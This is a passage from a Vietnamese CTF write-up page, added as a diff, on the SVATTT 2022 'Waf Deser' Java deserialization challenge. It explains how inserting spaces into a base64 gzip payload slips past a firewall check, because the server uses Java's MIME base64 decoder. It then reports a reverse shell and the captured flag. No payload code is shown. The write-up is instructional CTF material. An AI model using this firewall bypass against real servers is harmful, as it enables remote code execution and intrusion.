+</code></pre><p><code>H4sI</code> là đoạn base64 encode của magic byte + mode compress của file gzip. Mình có ngồi cố sửa byte header để khi base64 encode sẽ khác đi nhằm bypass nhưng không ăn thua cho đến khi mình thử fuzz chèn dấu space vào giữa thì lại bypass được. Ngoài dấu space thì các ký tự còn lại theo mình thử thì nếu khác null hay khác chứ cái + chữ số thì đều có thể bypass được - chưa hiểu tại sao không gây lỗi khi nạp gzip. Sau khi giải kết thúc mình tìm hiểu thêm mới để ý ở dây server dùng <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Base64.html#getMimeDecoder--">Base64.getMimeDecoder()</a> để decode đoạn base64. Mà <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Base64.html#mime">MIME type base64 decoding scheme</a> sẽ tự động bỏ qua các ký tự không thuộc <a href="https://www.ietf.org/rfc/rfc2045.txt">The Base64 Alphabet</a> nên khi chèn các kí tự đặc biệt vào giữa đoạn <code>H4sI</code> có thể bypass firewall mà không gây lỗi.</p>
+<p>Ở đây firewall cũng check uri size chỉ được phép bé hơn 3000 bytes nhưng khi compress và base64 encode payload mình không gặp vấn đề nào về size limit dù ở đây không có size limit thì vẫn phải gzip payload lại để không bị lỗi.</p>
+<p>Send payload lên server:</p>
+<p><img src="/images/2022/waf-deser/req1.png" alt="request1"></p>
+<p>Reverse shell trả về và đọc flag:</p>
+<p><img src="/images/2022/waf-deser/res1.png" alt="response1"></p>
+<p><strong>Flag</strong>: <code>ASCIS{0H_Mime_B@s364!T1me_2_le4rN_Seri0U5ly!!!!}</code></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Archives</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#review-source-code">Review Source Code</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#bypass">Bypass</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&text=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&title=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&is_video=false&description=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&title=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&title=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&name=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser&description=Preface%20Writeup%20b%c3%a0i%20web%20jeopardy%20java%20Waf%20Deser%20thu%e1%bb%99c%20gi%e1%ba%a3i%20SVATTT%202022%20v%c3%b2ng%20s%c6%a1%20kh%e1%ba%a3o%2c%20%c4%91%c3%a2y%20c%c5%a9ng%20l%c3%a0%20n%c4%83m%20%c4%91%e1%ba%a7u%20ti%c3%aan%20m%c3%acnh%20may%20m%e1%ba%afn%20n%e1%ba%b1m%20trong%20team%20c%e1%bb%a7a%20tr%c6%b0%e1%bb%9dng%20%c4%91%c6%b0%e1%bb%a3c%20tham%20d%e1%bb%b1%20gi%e1%ba%a3i%20n%c3%a0y%2c%20java%20l%c3%bac%20n%c3%a0y%20c%c5%a9ng%20kh%c3%a1%20xa%20l%e1%ba%a1%20%c4%91%e1%bb%91i%20v%e1%bb%9bi%20m%c3%acnh%20nh%c6%b0ng%20may%20m%e1%ba%afn%20team%20m%c3%acnh%20v%e1%ba%abn%20c%e1%bb%91%20g%e1%ba%afng%20v%c3%a0%20solved%20%c4%91%c6%b0%e1%bb%a3c%20v%c3%a0o%20ph%c3%bat%20ch%c3%b3t%20-%20nh%e1%bb%9d%20%c4%91%c3%b3%20c%c3%b3%20gi%e1%ba%a3i%20%e1%ba%b5m%20v%e1%bb%81%20hihi%21%0aSource-code%3a%20https%3a%2f%2fdrive.google.com%2ffile%2fd%2f1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q%2fview%3fusp%3dsharing%0aReview%20Source%20Code%20Sau%20khi%20gi%e1%ba%a3i%20n%c3%a9n%20m%c3%acnh%20%c4%91%c6%b0%e1%bb%a3c%201%20file%20jar%20%2b%20nginx." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&t=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  devme4f blogs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
